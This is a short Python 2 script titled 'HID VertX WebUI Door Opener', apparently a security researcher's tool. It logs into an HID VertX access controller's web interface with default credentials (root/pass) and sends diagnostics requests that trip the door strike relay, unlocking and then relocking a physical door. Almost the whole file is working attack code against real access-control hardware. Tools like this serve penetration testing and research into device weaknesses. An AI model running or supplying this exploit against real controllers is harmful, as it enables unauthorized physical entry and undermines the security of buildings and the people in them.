#!/usr/bin/env python
#
# VertX_WebOpen.py - HID VertX WebUI Door Opener
# by brad antoniewicz
#


import getopt
import sys
import time
import httplib
import urllib2
import base64

def usage():
        help = "Options:\n"
        help += "\t-h <host>\t host\n"
	help += "\t-u <username>\tUsername (default:root)\n"
	help += "\t-p <passowrd>\tPassword (default:pass)\n"
	return help

def main(): 
	print "VertX_WebOpen.py - HID VertX WebUI Door Opener"
	print "by brad antoniewicz"
	print "--------------------------------------\n"

	timestamp = int(time.time());
	targetIP=0
	user="root"
	password="pass"

	try:
		opts, args = getopt.getopt(sys.argv[1:], "h:u:p:",[])

	except getopt.GetoptError:
		print usage()
		return

	for o, a in opts:
		if o == "-h":
			targetIP = a
		if o == "-u":
			user = a
		if o == "-p":
			password = a
	
	if (targetIP == 0): 
		print usage()
		return

	b64encodedCreds = base64.b64encode(user + ":" + password);

	url="http://" + targetIP + "/cgi-bin/diagnostics_execute.cgi?ID=0&BoardType=V100&Description=Strike&Relay=1&Action=1&MS=" + str(timestamp) + "406" 
	url2="http://" + targetIP +"/cgi-bin/diagnostics_execute.cgi?ID=0&BoardType=V100&Description=Strike&Relay=1&Action=0&MS=" + str(timestamp) + "406" 

	header = { "Referer" : "http://" + targetIP + "/cgi-bin/diagnostics.cgi?Category=status",
		   "Authorization" : "Basic " + b64encodedCreds }

	print "[+] Sending VertX Unlock Request via WebUI"
	req=urllib2.Request(url,None, header)
	response=urllib2.urlopen(req)
	print "[+] Sent! - Door Open?"

	print "[+] Sending VertX Lock Request via WebUI"
	req=urllib2.Request(url2,None, header)
	response=urllib2.urlopen(req)
	print "[+] Sent! - Door Closed"

main()
